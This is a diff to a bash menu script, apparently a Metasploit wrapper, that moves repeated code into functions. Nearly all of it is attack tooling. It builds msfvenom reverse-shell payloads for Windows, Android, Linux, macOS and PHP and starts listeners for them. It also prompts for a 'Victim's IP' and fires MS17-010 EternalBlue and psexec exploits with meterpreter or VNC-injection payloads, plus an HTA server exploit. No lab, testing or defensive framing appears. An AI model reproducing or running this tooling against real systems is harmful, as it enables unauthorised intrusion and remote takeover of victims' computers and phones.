@@ -7,6 +7,142 @@ ip=$(hostname -I | cut -d' ' -f1)
 
 service postgresql start
 
+function create_windows_payload {
+  read -p "Enter the name of the payload (without extension): " payload_name
+  read -p "Enter the payload LHOST [$ip]: " lhost_payload
+  lhost_payload=${lhost_payload:-$ip}
+  read -p "Enter the payload LPORT [4444]: " lport_payload
+  lport_payload=${lport_payload:-4444}
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f exe > "$payload_name.exe"
+
+  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
+  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
+    lhost_listener=$lhost_payload
+    lport_listener=$lport_payload
+  else
+    read -p "Enter the listener LHOST: " lhost_listener
+    read -p "Enter the listener LPORT: " lport_listener
+  fi
+
+  msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
+}
+
+function create_android_payload {
+  read -p "Enter the name of the payload (without extension): " payload_name
+  read -p "Enter the payload LHOST [$ip]: " lhost_payload
+  lhost_payload=${lhost_payload:-$ip}
+  read -p "Enter the payload LPORT [4444]: " lport_payload
+  lport_payload=${lport_payload:-4444}
+  msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload > "$payload_name.apk"
+
+  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
+  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
+    lhost_listener=$lhost_payload
+    lport_listener=$lport_payload
+  else
+    read -p "Enter the listener LHOST: " lhost_listener
+    read -p "Enter the listener LPORT: " lport_listener
+  fi
+
+  msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
+}
+
+function create_linux_payload {
+  read -p "Enter the name of the payload (without extension): " payload_name
+  read -p "Enter the payload LHOST [$ip]: " lhost_payload
+  lhost_payload=${lhost_payload:-$ip}
+  read -p "Enter the payload LPORT [4444]: " lport_payload
+  lport_payload=${lport_payload:-4444}
+  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f elf > "$payload_name.elf"
+
+  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
+  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
+    lhost_listener=$lhost_payload
+    lport_listener=$lport_payload
+  else
+    read -p "Enter the listener LHOST: " lhost_listener
+    read -p "Enter the listener LPORT: " lport_listener
+  fi
+
+  msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
+}
+
+function create_macos_payload {
+  read -p "Enter the name of the payload (without extension): " payload_name
+  read -p "Enter the payload LHOST [$ip]: " lhost_payload
+  lhost_payload=${lhost_payload:-$ip}
+  read -p "Enter the payload LPORT [4444]: " lport_payload
+  lport_payload=${lport_payload:-4444}
+  msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f macho > "$payload_name.macho"
+
+  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
+  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
+    lhost_listener=$lhost_payload
+    lport_listener=$lport_payload
+  else
+    read -p "Enter the listener LHOST: " lhost_listener
+    read -p "Enter the listener LPORT: " lport_listener
+  fi
+
+  msfconsole -q -x "use exploit/multi/handler; set payload osx/x86/shell_reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
+}
+
+function create_web_payload {
+  read -p "Enter the name of the payload (without extension): " payload_name
+  read -p "Enter the payload LHOST [$ip]: " lhost_payload
+  lhost_payload=${lhost_payload:-$ip}
+  read -p "Enter the payload LPORT [80]: " lport_payload
+  lport_payload=${lport_payload:-80}
+  msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f raw > "$payload_name.php"
+
+  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
+  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
+    lhost_listener=$lhost_payload
+    lport_listener=$lport_payload
+  else
+    read -p "Enter the listener LHOST: " lhost_listener
+    read -p "Enter the listener LPORT: " lport_listener
+  fi
+
+  msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter_reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
+}
+
+function scan_vulnerable {
+  echo "Victim's IP:"
+  read r
+  msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $r; exploit; exit;"
+}
+
+function exploit_windows {
+  echo "Victim's IP:"
+  read r
+  msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $ip; set RHOST $r; exploit;"
+}
+
+function enable_remote_desktop {
+  echo "Victim's IP:"
+  read r
+  msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
+}
+
+function exploit_windows_psexec {
+  echo "Victim's IP:"
+  read r
+  msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set LHOST $ip; set RHOST $r; exploit;"
+}
+
+function enable_remote_desktop_psexec {
+  echo "Victim's IP:"
+  read r
+  msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
+}
+
+function exploit_windows_hta {
+  echo "Uripath: (/)"
+  read u
+  msfconsole -q -x "use exploit/windows/misc/hta_server; set SRVHOST $ip; set URIPATH /$u; set payload windows/meterpreter/reverse_tcp; set LHOST $ip; exploit;"
+}
+
 while true; do
   clear
 
@@ -30,129 +166,37 @@ while true; do
 
   case $x in
     1)
-      read -p "Enter the name of the payload (without extension): " payload_name
-      read -p "Enter the payload LHOST [$ip]: " lhost_payload
-      lhost_payload=${lhost_payload:-$ip}
-      read -p "Enter the payload LPORT [4444]: " lport_payload
-      lport_payload=${lport_payload:-4444}
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f exe > /root/Desktop/$payload_name.exe
-
-      read -p "Use same LHOST and LPORT for the listener? [Y/n]: " same_host_port
-      if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
-        lhost_listener=$lhost_payload
-        lport_listener=$lport_payload
-      else
-        read -p "Enter the listener LHOST: " lhost_listener
-        read -p "Enter the listener LPORT: " lport_listener
-      fi
-
-      msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
+      create_windows_payload
       ;;
     2)
-      read -p "Enter the name of the payload (without extension): " payload_name
-      read -p "Enter the payload LHOST [$ip]: " lhost_payload
-      lhost_payload=${lhost_payload:-$ip}
-      read -p "Enter the payload LPORT [4444]: " lport_payload
-      lport_payload=${lport_payload:-4444}
-      msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload > /root/Desktop/$payload_name.apk
-
-      read -p "Use same LHOST and LPORT for the listener? [Y/n]: " same_host_port
-      if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
-        lhost_listener=$lhost_payload
-        lport_listener=$lport_payload
-      else
-        read -p "Enter the listener LHOST: " lhost_listener
-        read -p "Enter the listener LPORT: " lport_listener
-      fi
-
-      msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
+      create_android_payload
       ;;
     3)
-      read -p "Enter the name of the payload (without extension): " payload_name
-      read -p "Enter the payload LHOST [$ip]: " lhost_payload
-      lhost_payload=${lhost_payload:-$ip}
-      read -p "Enter the payload LPORT [4444]: " lport_payload
-      lport_payload=${lport_payload:-4444}
-      msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload > /root/Desktop/$payload_name.py
-
-      read -p "Use same LHOST and LPORT for the listener? [Y/n]: " same_host_port
-      if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
-        lhost_listener=$lhost_payload
-        lport_listener=$lport_payload
-      else
-        read -p "Enter the listener LHOST: " lhost_listener
-        read -p "Enter the listener LPORT: " lport_listener
-      fi
-
-      msfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
+      create_linux_payload
       ;;
     4)
-      read -p "Enter the name of the payload (without extension): " payload_name
-      read -p "Enter the payload LHOST [$ip]: " lhost_payload
-      lhost_payload=${lhost_payload:-$ip}
-      read -p "Enter the payload LPORT [4444]: " lport_payload
-      lport_payload=${lport_payload:-4444}
-      msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload -f jar > /root/Desktop/$payload_name.jar
-
-      read -p "Use same LHOST and LPORT for the listener? [Y/n]: " same_host_port
-      if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
-        lhost_listener=$lhost_payload
-        lport_listener=$lport_payload
-      else
-        read -p "Enter the listener LHOST: " lhost_listener
-        read -p "Enter the listener LPORT: " lport_listener
-      fi
-
-      msfconsole -q -x "use exploit/multi/handler; set payload java/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
+      create_macos_payload
       ;;
     5)
-      read -p "Enter the name of the payload (without extension): " payload_name
-      read -p "Enter the payload LHOST [$ip]: " lhost_payload
-      lhost_payload=${lhost_payload:-$ip}
-      read -p "Enter the payload LPORT [4444]: " lport_payload
-      lport_payload=${lport_payload:-4444}
-      msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost_payload LPORT=$lport_payload > /root/Desktop/$payload_name.php
-
-      read -p "Use same LHOST and LPORT for the listener? [Y/n]: " same_host_port
-      if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
-        lhost_listener=$lhost_payload
-        lport_listener=$lport_payload
-      else
-        read -p "Enter the listener LHOST: " lhost_listener
-        read -p "Enter the listener LPORT: " lport_listener
-      fi
-
-      msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
+      create_web_payload
       ;;
     6)
-      echo "Victim's IP:"
-      read r
-      msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $r; exploit; exit;"
+      scan_vulnerable
       ;;
     7)
-      echo "Victim's IP:"
-      read r
-      msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $ip; set RHOST $r; exploit;"
+      exploit_windows
       ;;
     8)
-      echo "Victim's IP:"
-      read r
-      msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
+      enable_remote_desktop
       ;;
     9)
-      echo "Victim's IP:"
-      read r
-      msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set LHOST $ip; set RHOST $r; exploit;"
+      exploit_windows_psexec
       ;;
     10)
-      echo "Victim's IP:"
-      read r
-      msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
+      enable_remote_desktop_psexec
       ;;
     11)
-      echo 'Uripath: (/)'
-      read u
-      msfconsole -q -x "use exploit/windows/misc/hta_server; set SRVHOST $ip; set URIPATH /$u; set payload windows/meterpreter/reverse_tcp; set LHOST $ip; exploit;"
+      exploit_windows_hta
       ;;
     q)
       echo "Quitting..."
@@ -163,4 +207,3 @@ while true; do
       ;;
   esac
 done
-
